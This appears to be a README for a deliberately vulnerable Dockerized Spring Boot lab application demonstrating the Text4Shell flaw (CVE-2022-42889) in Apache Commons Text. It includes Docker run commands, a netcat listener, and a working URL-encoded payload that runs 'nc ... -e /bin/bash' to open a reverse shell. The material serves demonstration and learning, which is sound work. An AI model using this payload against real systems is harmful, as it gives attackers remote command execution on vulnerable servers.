# Text4Shell
### Vulnerable dockerized Spring Boot Application

This is a vulnerable Spring Boot application that is used to demonstrate the Text4Shell vulnerability. <br>
More information can be found [here](https://nvd.nist.gov/vuln/detail/CVE-2022-42889) <br>
Run the application using the following command:
```bash
docker build -t text4shell_app .
docker run -p 8080:8080 text4shell_app
```

The image is based on:
- [Alpine Linux](https://alpinelinux.org/)
- [OpenJDK 11](https://openjdk.java.net/)

The application is based on:
- [Spring Boot](https://spring.io/projects/spring-boot)
- [Apache Commons Text](https://commons.apache.org/proper/commons-text/)

Netcat (nmap-netcat) and bash are used to simulate a reverse shell scenario.

Use in WSL2:
```bash
nc -nvlp 8000
```
```bash
http://localhost/exploit?input=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%20172.27.22.30%208000%20-e%20%2Fbin%2Fbash%27%29%7D
```
Check for ip address with:
```bash
ip addr
```
--> eth0